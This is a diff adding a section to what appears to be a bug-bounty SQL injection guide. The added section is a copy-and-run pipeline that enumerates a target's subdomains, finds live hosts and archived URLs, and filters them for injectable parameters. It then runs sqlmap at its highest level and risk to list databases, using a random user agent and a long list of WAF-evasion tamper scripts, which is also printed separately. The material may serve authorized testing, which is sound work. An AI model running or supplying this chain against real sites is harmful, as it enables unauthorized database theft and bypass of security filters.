@@ -21,6 +21,28 @@ Here are some quick methods to detect the SQL Injection vulnerability, though th
   5. sqlmap -m sqli --dbs --batch
   6. use tamper scripts
 ```
+
+### Code Sampe for use :  
+
+Automation for above : 
+
+```   
+amass enum --passive -d domain.com | anew subdomains
+assetfinder --subs-only domain.com | anew subdomains  
+findomain -q --target domain.com | anew subdomains  
+cat subdomains | httprobe | anew alive
+cat alive | waybackurls | anew urls 
+gf sqli urls | anew sqli  
+sqlmap -m sqli --dbs --batch --level 3 --risk 3 --flush-session --random-agent --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor  
+```  
+
+**Temper Used :**  
+
+```  
+between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+```  
+* [ tamper from Bygcrowd : Json haddix](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423)   
+
 * More Details in this source thread [https://twitter.com/El3ctr0Byt3s/status/1302706241240731649](https://twitter.com/El3ctr0Byt3s/status/1302706241240731649)
 
 ## 3. Using heuristic scan to get hidden parameters :
